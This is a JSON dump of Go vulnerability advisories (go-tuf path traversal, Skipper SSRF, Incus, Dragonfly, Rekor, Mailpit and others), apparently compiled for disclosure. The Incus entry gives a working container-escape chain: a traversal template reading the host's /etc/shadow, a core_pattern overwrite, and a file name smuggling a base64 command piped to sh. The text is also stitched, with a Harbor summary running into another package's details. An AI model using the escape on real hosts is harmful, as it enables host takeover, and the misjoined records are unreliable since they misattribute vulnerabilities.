file is always local and trusted, this is closer to a configuration footgun and likely lands as MEDIUM/LOW.\n\n| Field | Value |\n|-------|-------|\n| **Affected Versions** | ≤ 2.4.0 |\n| **Verified On** | Commit `bde5f18dc95dfac365fc452ee4e278e5fd66d4b4` (tag v2.4.0) |\n\n> **Note:** First affected version has not been bisected.\n\n## Reproduction\n\nAttachments include `poc.zip` with:\n- `canonical.log` (contains `[CALLSITE_HIT]`, `[PROOF_MARKER]`)\n- `control.log` (contains `[CALLSITE_HIT]`, `[NC_MARKER]`, does not contain `[PROOF_MARKER]`)\n- `fix.patch` (minimal validation sketch)\n\n**Expected:** Multirepo repository names are treated as identifiers; a TAP 4 map file containing traversal or absolute paths is rejected (or safely normalized so that all writes stay under `LocalMetadataDir`).\n\n**Actual:** A traversal `repoName` escapes `LocalMetadataDir` and go-tuf persists `root.json` under the escaped path during initialization.\n\n### Run Local Repro\n\n```bash\nrm -rf _poc\nmkdir -p _poc\nunzip -q -o poc.zip -d _poc\ncd _poc/poc\nmake canonical\nmake control\n```\n\n## Workarounds\n\n1. Treat TAP 4 map files as trusted configuration only (do not fetch from untrusted sources).\n2. Validate repo names before passing the map file to go-tuf (reject absolute paths, path separators, and traversal components like `.` / `..`).\n3. If acceptable for the application, disable local caching to avoid writing metadata to disk (`DisableLocalCache=true`).\n\n## Suggested Remediation\n\nValidate multirepo repository names as identifiers (not paths) before using them in `filepath.Join`. Reject:\n- Absolute paths\n- Path separators (`/` and `\\`)\n- Traversal components (`.` and `..`)\n\nIf it is important to accept a wider set of repo names, a safer alternative is to map repo names to a stable, validated directory name (for example via encoding or hashing) and to ensure all writes stay under the cache base directory.\n\n## Triage Questions\n\n1. Is the TAP 4 map file expected to ever be fetched from untrusted sources in supported deployments?\n2. Should invalid repo names be treated as a hard error (reject initialization), or as a soft error (skip that repository entry)?\n\n## Attachments\n\n- [poc.zip](https://github.com/user-attachments/files/24849854/poc.zip)\n- [addendum.md](https://github.com/user-attachments/files/24849855/addendum.md)\n- [e2e.zip](https://github.com/user-attachments/files/24849856/e2e.zip)\n- [PR_DESCRIPTION.md](https://github.com/user-attachments/files/24849858/PR_DESCRIPTION.md)\n\n---\n\n*Reported by: Oleh*","affected":[{"package":{"name":"github.com/theupdateframework/go-tuf/v2","ecosystem":"Go","purl":"pkg:golang/github.com/theupdateframework/go-tuf/v2"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"2.4.1"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-jqc5-w2xx-5vq4/GHSA-jqc5-w2xx-5vq4.json"}}],"references":[{"type":"WEB","url":"https://github.com/theupdateframework/go-tuf/security/advisories/GHSA-jqc5-w2xx-5vq4"},{"type":"WEB","url":"https://github.com/theupdateframework/go-tuf/commit/d361e2ea24e427581343dee5c7a32b485d79fcc0"},{"type":"PACKAGE","url":"https://github.com/theupdateframework/go-tuf"}],"database_specific":{"cwe_ids":["CWE-22"],"github_reviewed":true,"github_reviewed_at":"2026-01-26T23:49:55Z","nvd_published_at":null,"severity":"MODERATE"},"severity":[{"type":"CVSS_V3","score":"CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N"}],"_metadata":{"fetched_at":"2026-01-27T01:17:40.383026Z","source":"go","ecosystem":"Go"}},{"schema_version":"1.7.3","id":"GHSA-mxxc-p822-2hx9","published":"2026-01-26T23:26:56Z","modified":"2026-01-26T23:41:19.688877Z","aliases":["CVE-2026-24470"],"summary":"Skipper Ingress Controller Allows Unauthorized Access to Internal Services via ExternalName","details":"### Impact\n\nWhen running Skipper as an Ingress controller, users with permissions to create an Ingress and a Service of type ExternalName can create routes that enable them to use Skipper's network access to reach internal services.\n\n### Patches\n\nhttps://github.com/zalando/skipper/releases/tag/v0.24.0 disables Kubernetes ExternalName by default.\n\n### Workarounds\n\nDevelopers can allow list targets of an ExternalName by using `-kubernetes-only-allowed-external-names=true` and allow list via regular expressions `-kubernetes-allowed-external-name '^[a-z][a-z0-9-.]+[.].allowed.example$'` \n\n### References\n\nhttps://kubernetes.io/docs/concepts/services-networking/service/#externalname","affected":[{"package":{"name":"github.com/zalando/skipper","ecosystem":"Go","purl":"pkg:golang/github.com/zalando/skipper"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"0.24.0"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-mxxc-p822-2hx9/GHSA-mxxc-p822-2hx9.json"}}],"references":[{"type":"WEB","url":"https://github.com/zalando/skipper/security/advisories/GHSA-mxxc-p822-2hx9"},{"type":"WEB","url":"https://github.com/zalando/skipper/commit/a4c87ce029a58eb8e1c2c1f93049194a39cf6219"},{"type":"PACKAGE","url":"https://github.com/zalando/skipper"},{"type":"WEB","url":"https://github.com/zalando/skipper/releases/tag/v0.24.0"},{"type":"WEB","url":"https://kubernetes.io/docs/concepts/services-networking/service/#externalname"}],"database_specific":{"cwe_ids":["CWE-441","CWE-918"],"github_reviewed":true,"github_reviewed_at":"2026-01-26T23:26:56Z","nvd_published_at":null,"severity":"HIGH"},"severity":[{"type":"CVSS_V3","score":"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"}],"_metadata":{"fetched_at":"2026-01-27T01:17:40.392946Z","source":"go","ecosystem":"Go"}},{"schema_version":"1.7.3","id":"GHSA-jf8p-3vjh-pq94","published":"2022-09-16T19:35:47Z","modified":"2026-01-26T17:41:15.796723Z","aliases":["BIT-harbor-2022-31666","CVE-2022-31666","GHSA-8hwq-5f22-jfr3"],"summary":"Harbor fails to validate the user permissions when viewing Webhook policies","details":"### Impact\nHarbor fails to validate the user permissions to view Webhook policies including relevant credentials configured in different projects the user doesn’t have access to, resulting in malicious users being able to read Webhook policies of other users/projects.

Attempts to read the `UserData` may result in a panic.\n\nThis issue only affects web sockets where an `AuthenticateMethod` is supplied to the handle options. Users who do not use web sockets, or users who do not require authentication are not at risk.\n\n#### Example\n\nIn the example below, one would expect that the `AuthenticateMethod` function would be called for each request to `/example`\n\n```go\nhandleOptions := web.HandleOptions{\n\tAuthenticateMethod: func(request *http.Request) interface{} {\n\t\t// Assume there is logic here to check for an active sessions, look at cookies or headers, etc...\n\t\tvar session Session{} // Example\n\n\t\treturn session\n\t},\n}\n\nserver.Socket(\"/example\", handle, handleOptions)\n```\n\nHowever, the method is not called, and therefor the `UserData` parameter of the request object in the handle will be nil, when it would have been expected to be the `session` object we returned.\n\n### Patches\n\nRelease v1.5.2 fixes this vulnerability. The authenticate method is now called for websocket requests.\n\nAll users of the web package should update to v1.5.2 or later.\n\n### Workarounds\n\nYou may work around this issue by making the authenticate method a named function, then calling that function at the start of the handle method for the websocket. Reject connections when the return value of the method is nil.","affected":[{"package":{"name":"github.com/ecnepsnai/web","ecosystem":"Go","purl":"pkg:golang/github.com/ecnepsnai/web"},"ranges":[{"type":"SEMVER","events":[{"introduced":"1.4.0"},{"fixed":"1.5.2"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/06/GHSA-5gjg-jgh4-gppm/GHSA-5gjg-jgh4-gppm.json"}}],"references":[{"type":"WEB","url":"https://github.com/ecnepsnai/web/security/advisories/GHSA-5gjg-jgh4-gppm"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2021-4236"},{"type":"WEB","url":"https://github.com/ecnepsnai/web/commit/5a78f8d5c41ce60dcf9f61aaf47a7a8dc3e0002f"},{"type":"PACKAGE","url":"https://github.com/ecnepsnai/web"},{"type":"WEB","url":"https://pkg.go.dev/vuln/GO-2021-0107"}],"database_specific":{"cwe_ids":["CWE-304","CWE-400","CWE-476"],"github_reviewed":true,"github_reviewed_at":"2021-05-21T17:41:20Z","nvd_published_at":null,"severity":"CRITICAL"},"severity":[{"type":"CVSS_V3","score":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}],"_metadata":{"fetched_at":"2026-01-27T01:17:40.298032Z","source":"go","ecosystem":"Go"}},{"schema_version":"1.7.3","id":"GHSA-7m6v-q233-q9j9","published":"2025-04-21T22:51:11Z","modified":"2026-01-23T17:33:54.615659Z","aliases":["CVE-2025-32963","GO-2025-3637"],"summary":"Minio Operator uses Kubernetes apiserver audience for AssumeRoleWithWebIdentity STS","details":"# Prevent token leakage / privilege escalation\n\n## MinIO Operator STS: A Quick Overview\n\nMinIO Operator STS is a native IAM Authentication for Kubernetes. MinIO Operator offers support for [Secure Tokens](https://min.io/docs/minio/linux/developers/security-token-service.html?ref=op-gh) (a.k.a. STS) which are a form of temporary access credentials for your MinIO Tenant. In essence, this allows you to control access to your MinIO tenant from your applications without having to explicitly create credentials for each application.\n\nFor an application to gain access into a MinIO Tenant, a `PolicyBinding` resource is required, granting explicit access to the applications by validating the kubernetes [Service Account](https://kubernetes.io/docs/concepts/security/service-accounts/) authorization token. \n\nThe service account token is validated as follows:\n\n1. The application calls `AssumeRoleWithWebIdentity` API MinIO Operator provides.\n2. MinIO Operator verifies the Service Account token agains the kubernetes API using the [TokenReview API](https://kubernetes.io/docs/reference/kubernetes-api/authentication-resources/token-review-v1/)\n3. MinIO Operator reviews the TokenReviewResult confirms if the token is a valid token and the user is authenticated.\n4. MinIO Operator validates the service account has `PolicyBinding` in the Tenant namespace.\n5. MinIO Operator gets the PolicyBinding\n6. MinIO Operator calls the AssumeRole API in the MinIO Tenant\n7. MinIO Operator obtains temporary credentials (STS).\n8. MinIO Operator return temporary Credentials to the requester application.\n9. The applicaiton consumes Object Storage using the temporary credentials.\n\n![STS Diagram](https://raw.githubusercontent.com/minio/operator/master/docs/images/sts-diagram.png)\n\n## Understanding Audiences in Kubernetes TokenReview\n\nIn step 2 the `TokenReview` API call attempts to authenticate a token to a known user, TokenReviewStatus is the result of the `TokenReview` request.\n\nAudiences are audience identifiers chosen by the authenticator that are compatible with both the TokenReview and token. \n\nAn identifier is any identifier in the intersection of the TokenReviewSpec audiences and the token's audiences.\n\nA client of the TokenReview API that sets the `spec.audiences` field should validate that a compatible audience identifier is returned in the status.audiences field to ensure that the TokenReview server is audience aware. \n**If no audiences are provided, the audience will default to the audience of the Kubernetes apiserver.**\n\n## Solution: Properly Issuing and Using Audience-Specific ServiceAccount Tokens\n\nThis PR ensures the Operator STS service request the Service Account JWT to belong to the audience`sts.min.io` in the TokenReviewRequest.\n\nThis PR ensures the examples and documentation provided guides in how to create Service accounts with \"disabled auto mount services tokens\", by doing this the pods where the service account is used no longer mounts the service account automatically in the path `/var/run/secrets/kubernetes.io/serviceaccount`.\n\nFor illustrative purposes, here is how you disable auto mount of service account tokens at the service account level.\n\n```yaml\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  namespace: namespace-name\n  name: service-account name\nautomountServiceAccountToken: false\n```\n\nAdditionally documentation and examples show how to request an audience-specific token with audience `sts.min.io`, by asking for an ServiceAccount Token to be audience specific.\n\nFor illustrative purposes, here is how you request an audience specific service account token in a pod:\n\n```yaml\napiVersion: batch/v1\nkind: Job\nmetadata:\n  name: job-name\n  namespace: job-namespace\nspec:\n  template:\n    spec:\n      serviceAccountName: service-account-name\n      volumes:\n        - name: sa-token\n          projected:\n            sources:\n              - serviceAccountToken:\n                  audience: \"sts.min.io\"\n                  expirationSeconds: 86400\n                  path: token\n      containers:\n        - name: mc\n...\n          volumeMounts:\n            - name: sa-token\n              mountPath: /var/run/secrets/sts.min.io/serviceaccount\n              readOnly: true\n```\n\n### How this prevent a token leakage or possible privilege escalation?.\n\nThis setup prevents privilege escalation and token leakage by combining multiple defense-in-depth mechanisms that ensure service account tokens are only usable by their intended audience, short-lived, and not exposed unnecessarily.\n\n#### Audience restriction (aud: sts.min.io)\n\n**Problem**: A ServiceAccount token is often valid for multiple audiences (e.g., the default Kubernetes API server). Without scoping, it can be replayed to other internal systems, which may unintentionally trust it.\n\n**Mitigation**: Now we enforce that tokens are explicitly created for the sts.min.io audience using the Kubernetes TokenRequest API, and the MinIO Operator:\n\nSends audiences: [\"sts.min.io\"] in the TokenReview.\n\nVerifies that the token was issued with this audience via status.audiences.\n\n**Effect**: Even if a token is stolen or misused, it will fail validation if used outside the sts.min.io STS endpoint (e.g., reused at the API server or another service).\n\n#### Token Leakage Mitigation\n\nDisabling auto-mounted service account tokens\n\n**Problem**: By default, Kubernetes mounts long-lived service account tokens into all pods at `/var/run/secrets/kubernetes.io/serviceaccount`, making them vulnerable to theft if the container is compromised.\n\n**Mitigation**:  No we guide users to set `automountServiceAccountToken: false` in their ServiceAccount definitions.\n\n**Effect**: Prevents automatic token injection into all pods, reducing the attack surface.\n\n####  Requesting short-lived, audience-specific tokens via serviceAccountToken projection\n\n**Problem**: Long-lived tokens can be reused indefinitely if leaked.\n**Mitigation**: You use projected service account tokens with: \n- audience: \"sts.min.io\"\n- A short expirationSeconds (e.g., 86400 = 24 hours, or even shorter)\n\n**Effect**: Even if the token is leaked, it is:\n\n- Only usable for sts.min.io\n- Short-lived and expires soon\n- Revocable by disabling the SA or STS access\n\n## Affected Versions and Risk Assessment\nThe issue affects MinIO Operator versions v5.0.x and above, when the STS feature was first introduced.\n\n* In v5.0.x, STS was introduced as v1alpha1 and disabled by default. It required explicit API calls to be used.\n* In v6.0.x, STS graduated to v1beta1 and was enabled by default, but still requires explicit calls to the STS API for token usage.\n\nThe risk is minimal, as:\n\n* The Operator does not persist the token (neither in memory nor on disk).\n* The Operator only uses the token for a single validation and does not reuse it for any other purpose.\n\n# Release\nFix released in [v7.1.0](https://github.com/minio/operator/releases/tag/v7.1.0)","affected":[{"package":{"name":"github.com/minio/operator","ecosystem":"Go","purl":"pkg:golang/github.com/minio/operator"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"7.1.0"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/04/GHSA-7m6v-q233-q9j9/GHSA-7m6v-q233-q9j9.json"}}],"references":[{"type":"WEB","url":"https://github.com/minio/operator/security/advisories/GHSA-7m6v-q233-q9j9"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2025-32963"},{"type":"WEB","url":"https://github.com/minio/operator/commit/d586294d526bf0d8e6097225114655f68b0adcc5"},{"type":"PACKAGE","url":"https://github.com/minio/operator"},{"type":"WEB","url":"https://github.com/minio/operator/releases/tag/v7.1.0"}],"database_specific":{"cwe_ids":["CWE-522"],"github_reviewed":true,"github_reviewed_at":"2025-04-21T22:51:11Z","nvd_published_at":"2025-04-22T18:16:00Z","severity":"MODERATE"},"severity":[{"type":"CVSS_V4","score":"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N"}],"_metadata":{"fetched_at":"2026-01-27T01:17:40.316328Z","source":"go","ecosystem":"Go"}},{"schema_version":"1.7.3","id":"GHSA-c32p-wcqj-j677","published":"2026-01-23T16:56:23Z","modified":"2026-01-23T17:03:57.842829Z","summary":"CometBFT has inconsistencies between how commit signatures are verified and how block time is derived","details":"# CSA-2026-001: Tachyon\n\n## Description\n\n**Name:** CSA-2026-001: Tachyon\n\n**Criticality:** Critical (Catastrophic Impact; Possible Likelihood per [ACMv1.2](https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md))\n\n**Affected versions:** All versions of CometBFT\n\n**Affected users:** Validators and protocols relying on block timestamps\n\n## Description\n\nA consensus-level vulnerability was discovered in CometBFT's \"BFT Time\" implementation due to an inconsistency between how commit signatures are verified and how block time is derived.\n\nThis breaks a core BFT Time guarantee: \"A faulty process cannot arbitrarily increase the Time value.\"\n\n## Impact\n\nDownstream impact on chains affects any module, smart contract, or system that relies on the block timestamp.\n\n## Patches\n\nThe new CometBFT releases [v0.38.21](https://github.com/cometbft/cometbft/releases/tag/v0.38.21) and [v0.37.18](https://github.com/cometbft/cometbft/releases/tag/v0.37.18) fix this issue.

This can also be exploited in IncusOS.\n\n### Details\nWhen using an image with a `metadata.yaml` containing templates, both the source and target paths are not checked for symbolic links or directory traversal. [1] [2] For example, the following `metadata.yaml` snippet can read an arbitrary file from the host root filesystem as root, and place it inside the container:\n\n```\ntemplates:\n  /shadow:\n    when:\n      - start\n    template: ../../../../../../../../etc/shadow\n```\n\nAdditionally, the path of the target of the template is not checked or opened safely, and can therefore contain symbolic links pointing outside the container root filesystem. For example:\n\n```\ntemplates:\n /realroot/proc/sys/kernel/core_pattern:\n    when:\n      - start\n    template: core_pattern.tpl\n```\n\nWhere the container root filesystem contains a symbolic link named `/realroot` pointing to `/`. This will cause the contents of the template (from the normal \"templates\" directory in this case) to be written to the host root filesystem as root.\n\nThis can be exploited to achieve arbitrary command execution on the host by overwriting key files. In the provided proof of concept, I am overwriting `/proc/sys/kernel/core_pattern`, followed by causing a crash inside the container once launched to execute arbitrary commands on the host. Many other methods are possible depending on the host operating system and configuration.\n\nThis vulnerability can be exploited by any user who can launch a new container with a custom image.\n\nExploiting this vulnerability on IncusOS requires a slight modification of stage2 to change to a different writable directory for the validation step (e.g /tmp). This can be confirmed with a second container with `/tmp` mounted from the host (A privileged action for validation only).\n\n\n[1] https://github.com/lxc/incus/blob/HEAD/internal/server/instance/drivers/driver_lxc.go#L7215\n[2] https://github.com/lxc/incus/blob/HEAD/internal/server/instance/drivers/driver_lxc.go#L7294\n\n### PoC\nA proof of concept script for the following can be found attached, named `template_arbitrary_write.sh`, which will show reading of a file from the host filesystem (`/etc/shadow`), as well as a method for escaping from the container to achieve arbitrary command execution, which will write a file to the root filesystem (`/template_arbitrary_write_cmd_exec_poc`).\n\nManual Reproduction steps:\n\n1. Obtain and unpack a legitimate root filesystem (e.g alpine/edge) into a directory named rootfs\n2. Inside the unpacked root filesystem, create a symbolic link named ‘realroot’ (i.e `ln -s / rootfs/realroot`)\n3. Create a directory named “templates” alongside the rootfs directory. Include a file `core_pattern.tpl` containing `|/bin/sh -c \"%E\"`\n4. Additionally, add files segfault.c and stage2 to the root filesystem (listed below), setting stage2 executable (`chmod +x rootfs/stage2`\n5. Create a `metadata.yaml` for this image. Sample listed below\n6. Create the image archive (`tar cf poc.tar *`) and import into incus (`incus image import poc.tar --alias poc`)\n7. Launch the newly imported image and obtain a shell (`incus launch poc poc --ephemeral; incus shell poc`)\n8. Observe that the file `/shadow` inside the container contains the contents of the `/etc/shadow` file from the host (host file read vulnerability)\n9. Compile `segfault.c` into a file named `x$(echo L3Zhci9saWIvaW5jdXMvY29udGFpbmVycy8qL3Jvb3Rmcy9zdGFnZTIK|base64 -d|sh)`. This filename will be interpolated into the `%E` value set in the `core_pattern` by the host file write vulnerability, and will find and execute the stage2 binary inside the container rootfs.\n10. Execute the compiled binary (e.g `/x*`). Observe the creation of the file `/template_arbitrary_write_cmd_exec_poc` on the host, containing the output of 'id' showing command execution by the host root user.\n\nsegfault.c:\n```\nint main() {\n    int *p = 0;\n    *p = 42;\n    return 0;\n}\n```\n\nstage2:\n```\n#!/bin/sh\nid > /template_arbitrary_write_cmd_exec_poc\n```\n\nmetadata.yaml:\n```\narchitecture: x86_64\ncreation_date: 1\nproperties:\n  architecture: amd64\n  description: Exploit\n  os: Exploit\n  release: Exploit 1.0\ntemplates:\n  /shadow:\n    when:\n      - start\n    template: ../../../../../../../../etc/shadow\n\n  /realroot/proc/sys/kernel/core_pattern:\n    when:\n      - start\n    template: core_pattern.tpl\n```\n\n### Impact\nA user with the ability to launch a container with a custom image can achieve arbitrary command execution on the host.\n\n### Attachments\n[template_arbitrary_write.sh](https://github.com/user-attachments/files/24473599/template_arbitrary_write.sh)\n[templates_arbitrary_write.patch](https://github.com/user-attachments/files/24473601/templates_arbitrary_write.patch)","affected":[{"package":{"name":"github.com/lxc/incus/v6/cmd/incusd","ecosystem":"Go","purl":"pkg:golang/github.com/lxc/incus/v6/cmd/incusd"},"ranges":[{"type":"SEMVER","events":[{"introduced":"6.1.0"},{"last_affected":"6.20.0"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-7f67-crqm-jgh7/GHSA-7f67-crqm-jgh7.json"}},{"package":{"name":"github.com/lxc/incus/v6/cmd/incusd","ecosystem":"Go","purl":"pkg:golang/github.com/lxc/incus/v6/cmd/incusd"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"last_affected":"6.0.5"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-7f67-crqm-jgh7/GHSA-7f67-crqm-jgh7.json"}}],"references":[{"type":"WEB","url":"https://github.com/lxc/incus/security/advisories/GHSA-7f67-crqm-jgh7"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2026-23954"},{"type":"PACKAGE","url":"https://github.com/lxc/incus"},{"type":"WEB","url":"https://github.com/lxc/incus/blob/HEAD/internal/server/instance/drivers/driver_lxc.go#L7215"},{"type":"WEB","url":"https://github.com/lxc/incus/blob/HEAD/internal/server/instance/drivers/driver_lxc.go#L7294"},{"type":"WEB","url":"https://github.com/user-attachments/files/24473599/template_arbitrary_write.sh"},{"type":"WEB","url":"https://github.com/user-attachments/files/24473601/templates_arbitrary_write.patch"}],"database_specific":{"cwe_ids":["CWE-22"],"github_reviewed":true,"github_reviewed_at":"2026-01-22T20:26:10Z","nvd_published_at":"2026-01-22T22:16:20Z","severity":"HIGH"},"severity":[{"type":"CVSS_V3","score":"CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N"}],"_metadata":{"fetched_at":"2026-01-27T01:17:40.314558Z","source":"go","ecosystem":"Go"}},{"schema_version":"1.7.3","id":"GHSA-j8hf-cp34-g4j7","published":"2026-01-22T18:04:07Z","modified":"2026-01-23T16:05:46.238551Z","aliases":["CVE-2026-24124"],"summary":"Dragonfly Manager Job API Unauthenticated Access","details":"## Summary\n\nDragonfly Manager's Job REST API endpoints lack authentication, allowing unauthenticated attackers to create, query, modify, and delete jobs, potentially leading to resource exhaustion, information disclosure, and service disruption.\n\n## Affected Products\n\n- **Product**: Dragonfly\n- **Component**: Manager (REST API)\n- **Affected Versions**: v2.x (based on source code analysis, including v2.4.0)\n- **Affected Endpoints**: `/api/v1/jobs`\n\n## Vulnerability Details\n\n### Description\n\nDragonfly Manager's Job API endpoints (`/api/v1/jobs`) lack JWT authentication middleware and RBAC authorization checks in the routing configuration.

Use firewall rules to limit source IPs\n   - Only allow trusted internal networks to access\n   - Use Kubernetes NetworkPolicy to restrict Pod-to-Pod communication\n\n2. **API Gateway**: Deploy an API gateway in front of Manager for authentication\n   - Use reverse proxies like Nginx/Kong/Traefik\n   - Configure OAuth2/JWT validation\n\n3. **Monitoring and Alerting**: Monitor abnormal access patterns to Job API\n   - Log all Job API calls\n   - Set up alerts for abnormal job creation/deletion\n\n### Verify Fix\n\nAfter the fix, all unauthenticated requests should return `401 Unauthorized`:\n\n```bash\ncurl -s -X GET http://localhost:8080/api/v1/jobs\n```\n\n**Expected Output**:\n```json\n{\n  \"message\": \"Unauthorized\"\n}\n```\n\n## Appendix: Complete Verification Logs\n\n### Deployment Verification Logs\n\n```bash\n$ kubectl -n dragonfly-system get pods\nNAME                                 READY   STATUS    RESTARTS   AGE\ndragonfly-manager-5cc788d64b-grpbk   1/1     Running   0          5m\ndragonfly-mysql-0                    1/1     Running   0          5m\ndragonfly-redis-master-0             1/1     Running   0          5m\ndragonfly-redis-replicas-0           1/1     Running   0          5m\ndragonfly-scheduler-0                1/1     Running   0          5m\ndragonfly-seed-client-0              1/1     Running   0          5m\n\n$ kubectl -n dragonfly-system get svc dragonfly-manager\nNAME                TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)              AGE\ndragonfly-manager   ClusterIP   10.96.240.126   <none>        8080/TCP,65003/TCP   5m\n```\n\n### POC Execution Complete Logs\n\nSee `poc_output.log` file for details.\n```\n==========================================\nVUL-001: Job API Unauthenticated Access POC\n==========================================\n\n[Test 1] GET /api/v1/jobs (No Authentication)\nHTTP Status: 200\nResponse: []\n✅ VULNERABLE: Endpoint accessible without authentication\n\n[Test 2] POST /api/v1/jobs (No Authentication)\nHTTP Status: 200\nJob ID: 2\n✅ VULNERABLE: Job created without authentication\n\n[Test 3] GET /api/v1/jobs/2 (No Authentication)\nHTTP Status: 200\n✅ VULNERABLE: Job details accessible without authentication\n\n[Test 4] PATCH /api/v1/jobs/2 (No Authentication)\nHTTP Status: 200\n✅ VULNERABLE: Job updated without authentication\n\n[Test 5] DELETE /api/v1/jobs/2 (No Authentication)\nHTTP Status: 200\n✅ VULNERABLE: Job deleted without authentication\n\n[Test 6] GET /api/v1/clusters (Should Require Authentication)\nHTTP Status: 401\nResponse: {\"message\":\"Unauthorized\"}\n✅ EXPECTED: Endpoint correctly requires authentication\n\n==========================================\nPOC Execution Complete\n==========================================\n\n```\n---\n\n## Patches\n\n- Dragonfy v2.4.1 and above.\n\n## Workarounds\n\nThere are no effective workarounds, beyond upgrading.","affected":[{"package":{"name":"d7y.io/dragonfly/v2","ecosystem":"Go","purl":"pkg:golang/d7y.io/dragonfly/v2"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"2.4.1"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-j8hf-cp34-g4j7/GHSA-j8hf-cp34-g4j7.json"}}],"references":[{"type":"WEB","url":"https://github.com/dragonflyoss/dragonfly/security/advisories/GHSA-j8hf-cp34-g4j7"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2026-24124"},{"type":"WEB","url":"https://github.com/dragonflyoss/dragonfly/commit/9fb9a2dfde3100f32dc7f48eabee4c2b64eac55f"},{"type":"PACKAGE","url":"https://github.com/dragonflyoss/dragonfly"}],"database_specific":{"cwe_ids":["CWE-306"],"github_reviewed":true,"github_reviewed_at":"2026-01-22T18:04:07Z","nvd_published_at":"2026-01-22T23:15:58Z","severity":"HIGH"},"severity":[{"type":"CVSS_V4","score":"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P"}],"_metadata":{"fetched_at":"2026-01-27T01:17:40.379238Z","source":"go","ecosystem":"Go"}},{"schema_version":"1.7.3","id":"GHSA-4c4x-jm2x-pf9j","published":"2026-01-22T18:41:26Z","modified":"2026-01-23T16:05:41.963826Z","aliases":["CVE-2026-24117"],"summary":"Rekor affected by Server-Side Request Forgery (SSRF) via provided public key URL","details":"## Summary\n\n`/api/v1/index/retrieve` supports retrieving a public key via a user-provided URL, allowing attackers to trigger SSRF to arbitrary internal services.\n\nSince the SSRF only can trigger GET requests, the request cannot mutate state.

This lack of Origin header validation introduces a Cross-Site WebSocket Hijacking (CSWSH) vulnerability.\n\nAn attacker can host a malicious website that, when visited by a developer running Mailpit locally, establishes a WebSocket connection to the victim's Mailpit instance (default ws://localhost:8025). This allows the attacker to intercept sensitive data such as email contents, headers, and server statistics in real-time.\n\n**Vulnerable Code**\nThe vulnerability exists in server/websockets/client.go where the CheckOrigin function is explicitly set to return true for all requests, bypassing standard Same-Origin Policy (SOP) protections provided by the gorilla/websocket library.\n\nhttps://github.com/axllent/mailpit/blob/877a9159ceeaf380d5bb0e1d84017b24d2e7b361/server/websockets/client.go#L34-L39\n\n**Impact**\nThis vulnerability impacts the Confidentiality of the data stored in or processed by Mailpit.\nAlthough Mailpit is often used as a local development tool, this vulnerability allows remote exploitation via a web browser.\n\n- **Scenario**: A developer has Mailpit running at localhost:8025.\n- **Trigger**: The developer visits a malicious website (or a compromised legitimate site) in the same browser.\n- **Exploitation**: The malicious site's JavaScript initiates a WebSocket connection to ws://localhost:8025/api/events. Since the origin check is disabled, the browser allows this cross-origin connection.\n- **Data Leak**: The attacker receives all broadcasted events, including full email details (subjects, sender/receiver info) and server metrics.\n\n**Attack Impact**\n- Real-time notification of new emails\n- Email metadata (sender, subject, recipients)\n- Mailbox statistics\n- All WebSocket broadcast data\n\n**Recommended Fix**\nThe `CheckOrigin` function should be removed to allow gorilla/websocket to enforce its default safe behavior (checking that the Origin matches the Host). Alternatively, strict validation logic should be implemented.\n\n**Proposed Change (Remove unsafe check):**\n\n```go\nvar upgrader = websocket.Upgrader{\n    ReadBufferSize:    1024,\n    WriteBufferSize:   1024,\n    // CheckOrigin: func(r *http.Request) bool { return true }, // REMOVED\n    EnableCompression: true,\n}\n```\n\n**Proof of Concept (PoC)**: To reproduce this vulnerability:\n\n- Start Mailpit (default settings).\n- Save the following HTML code as poc.html and serve it from a different origin (e.g., using python http.server on port 8000 or opening it directly as a file).\n- Open the [poc_websocket_hijack.html](https://github.com/user-attachments/files/24522726/poc_websocket_hijack.html) file in your browser.\n- Send a test email to Mailpit or perform any action in the Mailpit UI.\n- Observe that the \"malicious\" page successfully receives the event 